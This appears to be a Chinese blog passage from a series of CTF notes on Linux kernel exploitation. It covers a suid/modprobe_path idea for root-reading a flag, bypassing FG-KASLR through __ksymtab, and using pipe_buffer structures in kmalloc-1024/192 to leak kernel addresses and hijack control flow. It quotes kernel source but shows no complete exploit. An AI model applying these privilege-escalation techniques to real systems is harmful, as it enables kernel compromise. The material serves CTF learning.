<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329193540405.png" alt="image-20220329193540405"></p>
<p>我们也可以对其进行操控。</p>

        <h4 id="权限更改"   >
          <a href="#权限更改" class="heading-link"><i class="fas fa-link"></i></a><a href="#权限更改" class="headerlink" title="权限更改"></a>权限更改</h4>
      <p>猜想一下如果更改该文件，使其内容变为一个可执行的elf文件，功能为<code>cat /flag</code>，然后更改其权限，赋予suid的权限，那么在执行过程中，就可以以root权限来<code>cat flag</code>。形式如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329205636964.png" alt="image-20220329205636964"></p>

        <h4 id="存在问题"   >
          <a href="#存在问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h4>
      <p>但是这里有点问题，我实际操作的时候，权限倒是很容易更改，但是内容不能写入<code>\x00</code>和<code>\n</code>，就很不好制作一个可执行的ELF文件，不知道有没有什么其他办法绕过。</p>
<p>可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tinylab-1.gitbook.io/cbook/02-chapter8" >打造史上最小可执行ELF文件(45字节) - C 语言编程透视 (gitbook.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>此外之前P神的文章也提到，如果只是suid的权限的话，用shell脚本是不行的，所以这方面也不太能够搞定。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >谈一谈Linux与suid提权 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>至今还是不知道有没有什么其他的方法来绕过。</p>

        <h2 id="6-ksymtab数组"   >
          <a href="#6-ksymtab数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-ksymtab数组" class="headerlink" title="6.__ksymtab数组"></a>6.__ksymtab数组</h2>
      
        <h3 id="前置知识-2"   >
          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3>
      <p>通常用在开启<code>FG-KASLR</code>的情况，该保护需要编译时开启</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_FG_KASLR=y</span><br><span class="line">CONFIG_MODULE_FG_KASLR=y #模块随机化</span><br></pre></td></tr></table></div></figure>

<p>通过<code>nofgkaslr</code>来关闭</p>
<p>不过我在编译设置<code>.config</code>的时候，没有找到这些选项，不知道为什么。</p>
<p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#__ksymtab" >FGKASLR - CTF Wiki (ctf-wiki.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/" >Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>主要在于</p>
<ul>
<li><p>内核符号表<code>__ksymtab </code></p>
</li>
<li><p><code>.data</code></p>
</li>
<li><p><code>swapgs_restore_regs_and_return_to_usermode</code></p>
</li>
<li><p><code>modprobe_path</code></p>
</li>
<li><p>存在于<code>.text_base</code>到<code>__x86_retpoline_r15</code>的函数没有受到影响。显然<code>commit_creds</code>和<code>prepare_kernel_cred()</code>没有包含在内，但是可以在里面寻找一些gadget</p>
</li>
</ul>
<p>以上均不会发生<code>FG-KASLR</code>的随机化</p>
<p>那么这里就是主要关注于<code>__ksymtab</code>数组，存在于该数组中的每一个函数块都有如下结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /include/linux/export.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> value_offset;</span><br><span class="line">	<span class="keyword">int</span> name_offset;</span><br><span class="line">	<span class="keyword">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>注意是在v5.17下，在低版本下好像名字有点不同，不过也大同小异</p>

        <h3 id="绕过FG-KASLR"   >
          <a href="#绕过FG-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过FG-KASLR" class="headerlink" title="绕过FG-KASLR"></a>绕过FG-KASLR</h3>
      <p>因为<code>__ksymtab</code>是不会被该机制影响的，所以我们肯定可以在没有开启KASLR的时候通过<code>kallsym</code>来获取到该地址，接着就可以找到对应函数的<code>kernel_symbol</code>结构体偏移，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113641265.png" alt="image-20220330113641265"></p>
<p>所以就可以这样来得到对应的任意地址，计算的时候可以这样计算，通过补码来进行计算更快一点。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113813160.png" alt="image-20220330113813160"></p>

        <h2 id="7-pipe管道—kmalloc-1024-kmalloc-192"   >
          <a href="#7-pipe管道—kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-pipe管道—kmalloc-1024-kmalloc-192" class="headerlink" title="7.pipe管道—kmalloc-1024/kmalloc-192"></a>7.pipe管道—kmalloc-1024/kmalloc-192</h2>
      <p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31条消息) Linux系统调用：pipe()系统调用源码分析_rtoax的博客-CSDN博客_linux pipe 源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>通常来讲，管道用来在父进程和子进程之间通信，因为<code>fork</code>出来的子进程会继承父进程的文件描述符副本。这里就使用当前进程来创建管道符，从管道的读取端(<code>pipe_fd[0]</code>)和写入端(<code>pipe_fd[1]</code>)来进行利用。</p>

        <h3 id="1-使用方法"   >
          <a href="#1-使用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建"   >
          <a href="#①创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用pipe或者pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//默认阻塞状态</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>其中<code>pipe2</code>函数或者系统调用<code>__NR_pipe2</code>的<code>flag</code>支持除0之外的三种模式，可用在<code>man</code>手册中查看。</p>
<p>如果传入的<code>flag</code>为0，则和<code>pipe</code>函数是一样的，是阻塞的。</p>
<p>阻塞状态：即当没有数据在管道中时，如果还调用<code>read</code>从管道读取数据，那么就会使得程序处于阻塞状态，其他的也是类似的情况。</p>
<p>会默认创建两个fd文件描述符的，该fd文件描述符效果的相关结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>放入到<code>pipe_fd</code>中，如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>之后使用<code>write/read</code>来写入读取即可，注意写入端为<code>fd[1]</code>，读取端为<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放"   >
          <a href="#②释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放" class="headerlink" title="②释放"></a>②释放</h4>
      <p>由于<code>pipe</code>管道创建后会对应创建文件描述符，所以释放两端对应的文件描述符即可释放管道<code>pipe</code>管道</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>需要将两个文件描述符fd都给释放掉或者使用<code>read</code>将管道中所有数据都读取出来，才会进入<code>free_pipe_info</code>函数来释放在线性映射区域申请的相关内存资源，否则还是不会进入的。</p>

        <h3 id="2-内存分配与释放"   >
          <a href="#2-内存分配与释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①分配"   >
          <a href="#①分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配" class="headerlink" title="①分配"></a>①分配</h4>
      <p>发生在调用<code>pipe</code>/<code>pipe2</code>函数，或者系统调用<code>__NR_pipe</code>/<code>__NR_pipe2</code>时，内核入口为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() 系统调用 */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>调用之后会在内核的线性映射区域进行内存分配，也就是常见的内核堆管理的区域。分配点在如下函数中：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_info管理结构，大小为0xa0，属于kmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//相关的消息结构为pipe_buffer数组,总共16*0x28=0x280,直接从kmalloc-1024中拿取堆块</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//对申请的pipe管道进行一些初始化</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//出错的话则会释放掉，具体干啥的不太清楚</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关的<code>pipe_inode_info</code>结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//文件描述符计数，都为0时才会释放管道</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_buffer数组,16个,每个大小为0xa0,通常我们从这上面泄露地址或者劫持程序流</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-1"   >
          <a href="#②释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-1" class="headerlink" title="②释放"></a>②释放</h4>
      <p>直接使用<code>close</code>函数释放管道相关的文件描述符fd两端。</p>
<p>函数链调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>需要注意的时，在<code>put_pipe_info</code>函数中</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当files为0才会进入该函数</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>只有<code>pipe_inode_info</code>这个管理结构中的<code>files</code>成员为0，才会进行释放，也就是管道两端都关闭掉才行。</p>
<p>相关释放函数<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//和管道相关的释放有关，也是相关的漏洞点</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//释放pipe_buffer数组,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//释放pipe_inode_info管理结构,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-利用"   >
          <a href="#3-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="①信息泄露"   >
          <a href="#①信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#①信息泄露" class="headerlink" title="①信息泄露"></a>①信息泄露</h4>
      <p><code>pipe_buffer</code>结构的<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>其中的<code>ops</code>成员，即<code>struct pipe_buf_operations</code>结构的<code>pipe-&gt;bufs[i]-&gt;ops</code>，其中保存着全局的函数表，可通过这个来泄露内核基地址，相关结构如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②劫持程序流"   >
          <a href="#②劫持程序流" class="heading-link"><i class="fas fa-link"></i></a><a href="#②劫持程序流" class="headerlink" title="②劫持程序流"></a>②劫持程序流</h4>
      <p>当关闭了管道的两端时，调用到<code>free_pipe_info</code>函数，在清理<code>pipe_buffer</code>时进入如下判断：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>当管道中存在未被读取的数据时，即我们需要调用<code>write</code>向管道的写入端写入数据</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后不要将数据全部读取出来，如果全部读取出来的话，那么在<code>read</code>对应的<code>pipe_read</code>函数中就会如下情况</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    